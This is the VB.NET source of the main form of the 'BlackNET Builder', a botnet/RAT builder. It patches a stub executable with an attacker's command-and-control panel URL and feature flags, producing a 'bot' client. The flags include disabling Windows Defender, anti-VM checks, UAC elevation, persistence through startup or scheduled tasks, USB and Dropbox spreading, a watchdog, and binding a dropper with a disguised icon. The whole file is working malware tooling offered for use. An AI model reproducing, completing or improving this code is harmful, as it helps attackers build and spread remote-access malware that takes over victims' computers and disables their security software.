Imports System.Security.Cryptography
Imports System.IO
Imports Mono.Cecil
Imports Mono.Cecil.Cil
Imports System.Net
' - - - - - - - - - - -
' BlackNET Builder
' v3.5.0.0
' Developed by: Black.Hacker
' Tnx to: NYAN CAT, KFC, omerfademir.
' - - - - - - - - - - -
Public Class Form1
    Dim dialog As New SaveFileDialog
    Dim a As New OpenFileDialog
    Public trd As System.Threading.Thread
    Public st As Integer = 0
    Public BinderPath As String = ""
    Public dropPath As String = ""
    Public dropName As String = ""
    Public backupURL As String = ""
    Public Shared Function getMD5Hash(ByVal B As Byte()) As String
        B = New MD5CryptoServiceProvider().ComputeHash(B)
        Dim str2 As String = ""
        Dim num As Byte
        For Each num In B
            str2 = (str2 & num.ToString("x2"))
        Next
        Return str2
    End Function
    Public Function Randomisi2(ByVal lenght As Integer, ByVal charc As String) As String
        Randomize()
        Dim b() As Char
        Dim s As New System.Text.StringBuilder("")
        b = charc.ToCharArray()
        For i As Integer = 1 To lenght
            Randomize()
            Dim z As Integer = Int(((b.Length - 2) - 0 + 1) * Rnd()) + 1
            s.Append(b(z))
        Next
        Return s.ToString
    End Function

    Private Sub FlatTextBox3_MouseMove(sender As Object, e As MouseEventArgs) Handles FlatTextBox3.MouseMove
        FlatTextBox3.Text = "BN[xxxxxx-123456]".Replace("xxxxxx", Randomisi2(8, "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz")).Replace("123456", Randomisi2(7, "1234567890"))
    End Sub
    Private Sub FlatButton1_Click(sender As Object, e As EventArgs) Handles FlatButton1.Click
        If Not File.Exists((Application.StartupPath & "\stub.exe")) Then
            Interaction.MsgBox("Stub Not Found.", MsgBoxStyle.Critical, Nothing)
            Exit Sub
        ElseIf (FlatTextBox1.Text = "") Then
            Interaction.MsgBox("Please Enter Your BlackNET Panel URL.", MsgBoxStyle.Critical, Nothing)
            Exit Sub
        Else
            Dim definition As AssemblyDefinition
            definition = AssemblyDefinition.ReadAssembly((Application.StartupPath & "\stub.exe"))
            Dim definition2 As ModuleDefinition
            For Each definition2 In definition.Modules
                Dim definition3 As TypeDefinition
                For Each definition3 In definition2.Types
                    Dim definition4 As MethodDefinition
                    For Each definition4 In definition3.Methods
                        If (definition4.IsConstructor AndAlso definition4.HasBody) Then
                            Dim enumerator As IEnumerator(Of Instruction)
                            Try
                                enumerator = definition4.Body.Instructions.GetEnumerator
                                Do While enumerator.MoveNext
                                    Dim current As Instruction = enumerator.Current
                                    If ((current.OpCode.Code = Code.Ldstr) And (Not current.Operand Is Nothing)) Then
                                        Dim str As String = current.Operand.ToString
                                        If (str = "[HOST]") Then
                                            If FlatCheckBox6.Checked Then
                                                current.Operand = AES_Encrypt(FlatTextBox1.Text, TextBox1.Text)
                                            Else
                                                current.Operand = FlatTextBox1.Text
                                            End If
                                        Else

                                            If (str = "[ID]") Then
                                                current.Operand = FlatTextBox2.Text
                                            End If

                                            If (str = "[StartupName]") Then
                                                current.Operand = getMD5Hash(File.ReadAllBytes(Application.StartupPath & "\" & "Stub.exe"))
                                            End If

                                            If (str = "[MUTEX]") Then
                                                current.Operand = FlatTextBox3.Text
                                            End If

                                            If (str = "[Watcher_Status]") Then
                                                current.Operand = FlatCheckBox8.Checked.ToString
                                            End If

                                            If (FlatCheckBox8.Checked = True) Then
                                                If (str = "[Watcher_Bytes]") Then
                                                    current.Operand = Convert.ToBase64String(IO.File.ReadAllBytes("watcher.exe"))
                                                End If
                                            End If

                                            If (str = "[Install_Path]") Then
                                                current.Operand = FlatComboBox1.Text
                                            End If

                                            If (str = "[Install_Name]") Then
                                                current.Operand = FlatTextBox5.Text
                                            End If

                                            If (str = "[Startup]") Then
                                                current.Operand = FlatCheckBox1.Checked.ToString
                                            End If


                                            If (str = "[BypassSCP]") Then
                                                current.Operand = FlatCheckBox2.Checked.ToString
                                            End If

                                            If (str = "[DisableWD]") Then
                                                current.Operand = FlatCheckBox15.Checked.ToString
                                            End If

                                            If (str = "[AntiVM]") Then
                                                current.Operand = FlatCheckBox13.Checked.ToString
                                            End If

                                            If (str = "[HardInstall]") Then
                                                current.Operand = FlatCheckBox7.Checked.ToString
                                            End If

                                            If (str = "[USBSpread]") Then
                                                current.Operand = FlatCheckBox4.Checked.ToString
                                            End If

                                            If (str = "[AESKey]") Then
                                                current.Operand = TextBox1.Text
                                            End If

                                            If (str = "[EncStatus]") Then
                                                current.Operand = FlatCheckBox6.Checked.ToString
                                            End If

                                            If (str = "[DropBox_Spread]") Then
                                                current.Operand = FlatCheckBox9.Checked.ToString
                                            End If

                                            If (str = "[Added_SchTask]") Then
                                                current.Operand = FlatCheckBox10.Checked.ToString
                                            End If

                                            If (str = "[ElevateUAC]") Then
                                                current.Operand = FlatCheckBox3.Checked.ToString
                                            End If

                                            If (str = "[BinderStatus]") Then
                                                current.Operand = FlatCheckBox12.Checked.ToString
                                            End If

                                            If FlatCheckBox12.Checked = True Then
                                                If (str = "[BinderBytes]") Then
                                                    current.Operand = Convert.ToBase64String(File.ReadAllBytes(BinderPath))
                                                End If
                                                If (str = "[DropperPath]") Then
                                                    current.Operand = dropPath
                                                End If
                                                If (str = "[DropperName]") Then
                                                    current.Operand = dropName
                                                End If
                                            End If
                                        End If
                                    End If
                                Loop
                            Finally
                            End Try
                        End If
                    Next
                Next
            Next
            With dialog
                .InitialDirectory = Application.StartupPath
                .FileName = "Client.exe"
                .Filter = "Executable Applications (*.exe)|*.exe"
                .Title = "Choose a place to save your bot | BlackNET v" & ProductVersion
            End With
            If dialog.ShowDialog = DialogResult.OK Then
                definition.Write(dialog.FileName)
                If FlatCheckBox5.Checked = True Then
                    IconChanger.InjectIcon(dialog.FileName, a.FileName)
                End If
                MsgBox("Your Client Has Been Compiled.", MsgBoxStyle.Information, "Done !")
            Else
                Return
            End If
        End If
    End Sub
    Public Function AES_Encrypt(ByVal input As String, ByVal pass As String) As String
        Dim AES As New System.Security.Cryptography.RijndaelManaged
        Dim Hash_AES As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim encrypted As String = ""
        Try
            Dim hash(31) As Byte
            Dim temp As Byte() = Hash_AES.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes(pass))
            Array.Copy(temp, 0, hash, 0, 16)
            Array.Copy(temp, 0, hash, 15, 16)
            AES.Key = hash
            AES.Mode = CipherMode.ECB
            Dim DESEncrypter As System.Security.Cryptography.ICryptoTransform = AES.CreateEncryptor
            Dim Buffer As Byte() = System.Text.ASCIIEncoding.ASCII.GetBytes(input)
            encrypted = Convert.ToBase64String(DESEncrypter.TransformFinalBlock(Buffer, 0, Buffer.Length))
            Return encrypted
        Catch ex As Exception
            Return input
        End Try
    End Function
    Private Sub PictureBox1_Click(sender As Object, e As EventArgs) Handles PictureBox1.Click
        With a
            .Filter = "icon File (*.ico)|*.ico"
            .Title = "Select Icon"
            If .ShowDialog = Windows.Forms.DialogResult.OK Then
                PictureBox1.Image = Image.FromFile(a.FileName)
            End If
        End With
    End Sub
    Public Function check_panel(Panel As String)
        Try
            Dim Check As New WebClient
            Dim status As String = Check.DownloadString(Panel & "/check_panel.php")
            If status = "Panel Enabled" Then
                Return True
            Else
                Return False
            End If
        Catch ex As Exception
            Return False
        End Try
    End Function
    Private Sub FlatCheckBox6_CheckedChanged(sender As Object) Handles FlatCheckBox6.CheckedChanged
        If FlatCheckBox6.Checked Then
            TextBox1.Text = Randomisi2(125, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789!@#$%^&*")
        Else
            TextBox1.Text = ""
        End If
    End Sub

    Private Sub FlatCheckBox5_CheckedChanged(sender As Object) Handles FlatCheckBox5.CheckedChanged
        If FlatCheckBox5.Checked = False Then
            If Not PictureBox1.Image Is Nothing Then
                PictureBox1.Image = Nothing
            End If
        End If
    End Sub
    Private Sub FlatCheckBox7_CheckedChanged(sender As Object) Handles FlatCheckBox7.CheckedChanged
        Select Case FlatCheckBox7.Checked
            Case True
                FlatComboBox1.Enabled = True
                FlatTextBox5.Enabled = True
            Case False
                FlatComboBox1.Enabled = False
                FlatTextBox5.Enabled = False
        End Select
    End Sub
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles Me.Load
        FlatComboBox1.SelectedItem = FlatComboBox1.Items.Item(0)
        FlatStatusBar1.Text = "Version: v" & ProductVersion
        If Not My.Settings.Host = "" Then
            FlatTextBox1.Text = My.Settings.Host
            FlatTextBox2.Text = My.Settings.ID
            FlatTextBox3.Text = My.Settings.MUTEX
            FlatTextBox5.Text = My.Settings.Filename
            FlatCheckBox1.Checked = My.Settings.Startup
            FlatCheckBox2.Checked = My.Settings.AntiDebug
            FlatCheckBox3.Checked = My.Settings.UAC
            FlatCheckBox4.Checked = My.Settings.USB
            FlatCheckBox6.Checked = My.Settings.RSA
            FlatCheckBox7.Checked = My.Settings.Stealth
            FlatCheckBox8.Checked = My.Settings.Watchdog
            FlatCheckBox9.Checked = My.Settings.Dropbox
            FlatCheckBox10.Checked = My.Settings.Schtask
            FlatCheckBox13.Checked = My.Settings.VM
            FlatCheckBox15.Checked = My.Settings.DWinDef
        End If
    End Sub

    Private Sub FlatButton2_Click(sender As Object, e As EventArgs) Handles FlatButton2.Click
        If check_panel(FlatTextBox1.Text) Then
            MessageBox.Show("Your Panel is Enabled.", "Panel Status", MessageBoxButtons.OK, MessageBoxIcon.Information)
        Else
            MessageBox.Show("Your Panel is Disabled or Does not Exist.", "Panel Status", MessageBoxButtons.OK, MessageBoxIcon.Error)
        End If
    End Sub

    Private Sub FlatButton3_Click(sender As Object, e As EventArgs) Handles FlatButton3.Click
        Dim DownloadVersion As New WebClient
        Dim CurrentVersion As String = ProductVersion
        Dim GitHubVersion As String = DownloadVersion.DownloadString("https://raw.githubusercontent.com/BlackHacker511/BlackNET/master/version.txt")

        If (Integer.Parse(GitHubVersion.Replace("v", "").Replace(".", "")) = Integer.Parse(CurrentVersion.Replace(".", ""))) Then
            MessageBox.Show("BlackNET is Up to Date.", "Update check", MessageBoxButtons.OK, MessageBoxIcon.Information)
            FlatStatusBar1.Text = "Up to Date"
        Else
            MessageBox.Show("New update is available," + vbNewLine + "Download it from GitHub", "Update check", MessageBoxButtons.OK, MessageBoxIcon.Information)
            FlatStatusBar1.Text = "New update is available."
        End If
    End Sub

    Private Sub FlatLabel2_Click(sender As Object, e As EventArgs) Handles FlatLabel2.Click
        FlatTextBox2.Text = Randomisi2(6, "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
    End Sub
    Private Sub FlatCheckBox1_CheckedChanged(sender As Object) Handles FlatCheckBox1.CheckedChanged
        If (FlatCheckBox10.Checked = True) Then
            FlatCheckBox10.Checked = False
        End If
    End Sub

    Private Sub FlatCheckBox10_CheckedChanged(sender As Object) Handles FlatCheckBox10.CheckedChanged
        If (FlatCheckBox1.Checked = True) Then
            FlatCheckBox1.Checked = False
        End If
    End Sub

    Private Sub FlatCheckBox12_CheckedChanged(sender As Object) Handles FlatCheckBox12.CheckedChanged
        If FlatCheckBox12.Checked = True Then
            Binder.Show()
        End If
    End Sub

    Private Sub FlatClose1_Click(sender As Object, e As EventArgs) Handles FlatClose1.Click
        If MessageBox.Show("Do you want to save your current settings?", "Close", MessageBoxButtons.YesNo, MessageBoxIcon.Information) = Windows.Forms.DialogResult.Yes Then
            My.Settings.Host = FlatTextBox1.Text
            My.Settings.ID = FlatTextBox2.Text
            My.Settings.MUTEX = FlatTextBox3.Text
            My.Settings.Filename = FlatTextBox5.Text
            My.Settings.Startup = FlatCheckBox1.Checked
            My.Settings.AntiDebug = FlatCheckBox2.Checked
            My.Settings.UAC = FlatCheckBox3.Checked
            My.Settings.USB = FlatCheckBox4.Checked
            My.Settings.RSA = FlatCheckBox6.Checked
            My.Settings.Stealth = FlatCheckBox7.Checked
            My.Settings.Watchdog = FlatCheckBox8.Checked
            My.Settings.Dropbox = FlatCheckBox9.Checked
            My.Settings.Schtask = FlatCheckBox10.Checked
            My.Settings.VM = FlatCheckBox13.Checked
            My.Settings.DWinDef = FlatCheckBox15.Checked
            My.Settings.Save()
        Else
            My.Settings.Reset()
        End If
    End Sub
End Class


